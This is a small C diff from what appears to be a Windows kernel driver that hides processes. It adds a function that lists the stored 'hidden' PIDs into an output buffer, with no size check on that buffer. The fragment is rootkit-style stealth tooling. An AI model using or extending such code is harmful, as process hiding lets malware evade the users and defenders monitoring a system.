@@ -177,6 +177,20 @@ NTSTATUS UnHideProc(_In_ Globals* g_state, ULONG index) {
 	return status; 
 }
 
+void WriteHiddenProcessesInOutputBuffer(ULONG* outputBuffer, Globals* g_state) {
+	ULONG hiddenProc = g_state->PidsCount;
+	ULONG count = 0; 
+
+	for (ULONG i = 0; i < MAX_PIDS && count < hiddenProc; i++) {
+		if (g_state->Pids[i]) {
+			//copy in output buffer the pid
+			outputBuffer[count] = g_state->Pids[i];
+			count++;
+		}
+	}
+	return;
+}
+
 NTSTATUS CompleteRequest(PIRP Irp, NTSTATUS status, ULONG_PTR info) {
 	Irp->IoStatus.Status = status; 
 	Irp->IoStatus.Information = info; 
